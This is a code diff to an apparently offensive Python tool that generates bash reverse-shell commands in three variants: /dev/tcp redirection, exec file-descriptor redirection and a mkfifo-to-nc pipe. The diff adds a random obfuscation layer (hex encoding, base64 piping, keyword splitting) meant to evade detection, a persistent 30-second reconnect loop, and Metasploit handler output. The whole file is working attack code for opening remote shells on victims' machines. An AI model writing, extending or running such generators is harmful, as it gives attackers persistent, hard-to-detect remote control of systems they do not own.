@@ -1,39 +1,65 @@
 import random
-from .base import RandomNamePool, ShellGenerator, ShellResult
+from .base import (
+    RandomNamePool, ShellGenerator, ShellOptions, ShellResult,
+    TTY_UPGRADE, msf_handler, LISTENER_FMT,
+)
+from .obfuscate import bash_hex_encode, bash_base64_pipe, bash_split_keyword
 
-_BASH_PATHS = ["/bin/bash", "/bin/sh"]
 _VARIANTS = ["dev_tcp", "exec_redirect", "mkfifo"]
 
 
 class BashGenerator(ShellGenerator):
     language = "bash"
 
-    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
+    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
         variant = random.choice(_VARIANTS)
-        shell = random.choice(_BASH_PATHS) if names else "/bin/bash"
+        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/bash"
 
         if variant == "dev_tcp":
-            cmd = self._dev_tcp(lhost, lport, shell, names)
+            raw = self._dev_tcp(opts, shell, names)
         elif variant == "exec_redirect":
-            cmd = self._exec_redirect(lhost, lport, shell, names)
+            raw = self._exec_redirect(opts, shell, names)
         else:
-            cmd = self._mkfifo(lhost, lport, shell, names)
+            raw = self._mkfifo(opts, shell, names)
 
-        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)
+        # Deep obfuscation layer: randomly pick a second-level technique
+        if names:
+            technique = random.choice(["hex", "base64", "split", "none"])
+            if technique == "hex":
+                raw = raw.replace(shell, bash_hex_encode(shell))
+            elif technique == "base64" and variant != "mkfifo":
+                raw = bash_base64_pipe(raw)
+                variant = f"{variant}_b64"
+            elif technique == "split":
+                keyword = shell.split("/")[-1]
+                setup, ref = bash_split_keyword(keyword)
+                raw = f"{setup};{raw.replace(keyword, ref)}"
 
-    def _dev_tcp(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
-        return f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+        cmd = f"while :; do {raw}; sleep 30; done" if opts.retry else raw
 
-    def _exec_redirect(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
+        return ShellResult(
+            command=cmd,
+            variant=variant,
+            language=self.language,
+            arch=opts.arch,
+            listener=LISTENER_FMT.format(lport=opts.lport),
+            tty_upgrade=TTY_UPGRADE,
+            msf_compat=msf_handler("payload/cmd/unix/reverse_bash", opts.lhost, opts.lport),
+        )
+
+    def _dev_tcp(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
+        return f"{shell} -i >& /dev/tcp/{opts.lhost}/{opts.lport} 0>&1"
+
+    def _exec_redirect(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
         fd = random.choice([5, 3, 4, 6]) if names else 5
         return (
-            f"exec {fd}<>/dev/tcp/{lhost}/{lport};"
+            f"exec {fd}<>/dev/tcp/{opts.lhost}/{opts.lport};"
             f"{shell} <&{fd} >&{fd} 2>&{fd}"
         )
 
-    def _mkfifo(self, lhost: str, lport: int, shell: str, names: RandomNamePool | None) -> str:
+    def _mkfifo(self, opts: ShellOptions, shell: str, names: RandomNamePool | None) -> str:
         pipe = self._var("f", names)
         return (
             f"rm -f /tmp/{pipe}; mkfifo /tmp/{pipe}; "
-            f"cat /tmp/{pipe} | {shell} -i 2>&1 | nc {lhost} {lport} > /tmp/{pipe}"
+            f"cat /tmp/{pipe} | {shell} -i 2>&1 | nc {opts.lhost} {opts.lport} > /tmp/{pipe}"
         )
